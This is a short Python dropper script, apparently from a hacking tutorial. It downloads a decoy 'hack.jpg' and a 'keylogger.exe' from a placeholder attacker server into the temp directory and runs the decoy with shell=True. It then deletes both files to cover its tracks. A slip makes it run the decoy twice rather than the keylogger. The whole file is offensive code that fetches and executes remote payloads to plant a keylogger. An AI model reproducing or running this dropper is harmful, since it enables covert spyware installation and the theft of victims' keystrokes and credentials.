#!usr/bin/env python

import os
import requests
import subprocess
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://your_server_ip/hack.jpg")
subprocess.Popen("hack.jpg", shell=True)

download("http://your_server_ip/keylogger.exe")
subprocess.call("hack.jpg", shell=True)

os.remove("hack.jpg")
os.remove("keylogger.exe")
